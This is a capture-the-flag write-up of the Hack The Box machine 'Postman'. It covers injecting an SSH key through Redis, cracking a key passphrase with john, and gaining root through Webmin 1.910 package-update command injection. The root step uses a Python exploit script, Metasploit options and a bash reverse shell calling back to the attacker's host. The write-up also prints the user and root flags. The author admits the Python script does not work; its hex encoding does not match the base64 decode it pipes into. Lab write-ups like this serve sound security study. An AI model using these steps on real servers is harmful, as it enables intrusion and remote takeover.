+++
title = "HTB - Postman"
date = 2024-11-29
+++

### Scan
```
nmap -sV -sC -p- --open 10.10.10.160
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-28 14:12 EST
Nmap scan report for 10.10.10.160
Host is up (0.099s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: The Cyber Geek's Personal Website
|_http-server-header: Apache/2.4.29 (Ubuntu)
6379/tcp  open  redis   Redis key-value store 4.0.9
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 70.96 seconds
```

### Enumeration
Website on `80` initially shows promise, but there isn't much worth digging into.
The port on 10000 yields a webmin portal. Looking at writeup for 0xdf, it's likely a late stage pivot.
Redis-Cli we can leverage a File-Read type of privilege. Talk in the report about what Redis is and syntax
We can set our key with: `incr li0t`, then we can check our scope with `config get dir`. We can try to smuggle our SSH key by going to `config set dir ./.ssh`. The fact that this command works suggests we are in the `redis` user home directory.
We can generate a key to pass to the redis-cli service and then initiate a connection through SSH. We can have Redis save it to a db called authorized_keys.
```
ssh-keygen -t rsa -f li0t

(echo -e "\n\n"; cat /home/li0t/Desktop/HTB/Postman/li0t.pub; echo -e "\n\n") > li0t.txt

cat li0t.txt | redis-cli -h 10.10.10.160 -x set li0t

ssh -i li0t redis@10.10.10.160
```

Now that we're in, we can `ls -la` to poke around, and we find that .bash_history is a file. It looks interesting. After reviewing and rooting around in home directory and find a user named Matt.

We can see what belongs to Matt: `find / -user Matt 2>/dev/null`. We find a id_rsa backup file and we can access! It's encrypted. SSH2John for cracking. `ssh2john e.key > ersa.key`, `john --wordlist=/usr/share/wordlists/rockyou.txt ersa.key`. We find the password to be `computer2008`

SSH doesn't work. We can, though, `su` to Matt with the same password.

USER: `b1e986e3273e0e98d70e17ec7a7c2db2`

The credentials work on the box. Webmin is version 1.910. We can do a searchsploit. Comes back positively!

I got close with a python script, but it didn't quite work:
```python
import requests
import re
import html
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# Suppress warnings for unverified HTTPS requests (not recommended for production)
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Initialize a session to manage cookies and persistent headers
session = requests.Session()

# Headers to mimic a real browser
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
    "Referer": "https://postman.htb/"
}

# Credentials and target details
url_base = "https://postman.htb"
login_url = f"{url_base}/session_login.cgi"
payload_url = f"{url_base}/package-updates/update.cgi"
username = "Matt"
password = "computer2008"

try:
    # Step 1: Send GET request to the login page to get cookies
    login_page_response = session.get(login_url, headers=headers, verify=False)
    print("[*] Initial cookies set:", session.cookies.get_dict())

    # Step 2: Login
    login_data = {'page': '', 'user': username, 'pass': password}
    print("[*] Attempting to log in...")
    login_response = session.post(login_url, data=login_data, headers=headers, verify=False)

    if login_response.status_code == 200 and "Set-Cookie" in login_response.headers:
        print("[+] Login successful!")
    else:
        print("[-] Login failed. Check your credentials or server configuration.")
        print("Server Response:", login_response.text)
        exit()

    # Verify cookies are set
    if not session.cookies:
        print("[-] No cookies were set. Ensure the server accepts your request.")
        exit()
    print("[+] Cookies successfully set.")

    # Step 3: Craft and send payload
    reverse_shell = "bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/<YOUR_PORT> 0>&1'"
    b64_payload = reverse_shell.encode("utf-8").hex()

    payload_data = [
        ('u', 'acl/apt'),
        ('u', f'| bash -c "echo {b64_payload}|base64 -d|bash -i"'),
        ('ok_top', 'Update Selected Packages')
    ]

    # Send payload to the server
    print("[*] Sending payload...")
    response = session.post(payload_url, data=payload_data, headers=headers, verify=False)
    if response.status_code == 200:
        print("[+] Payload delivered successfully!")
        # Extract and decode response output
        raw_output = re.findall('<pre>(.*)</pre>', response.text, re.DOTALL)
        if raw_output:
            decoded_output = html.unescape(raw_output[0])
            print(f"[+] Command Output: {decoded_output.strip()}")
    else:
        print(f"[-] Failed to deliver payload, Status Code: {response.status_code}")

except requests.exceptions.RequestException as e:
    print(f"[!] An error occurred: {e}")

```
MSF module for the Webmin version will yield RCE:
```
msf6 exploit(linux/http/webmin_packageup_rce) > show options

Module options (exploit/linux/http/webmin_packageup_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   computer2008     yes       Webmin Password
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.10.10.160     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      10000            yes       The target port (TCP)
   SSL        true             no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base path for Webmin application
   USERNAME   Matt             yes       Webmin Username
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.10      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

```
Set up a listener and use a bash one-liner:
`bash -c 'bash -i >& /dev/tcp/10.10.14.10/443 0>&1'`

ROOT: `859121f9e5a0f11b08fff5f743e266b6`





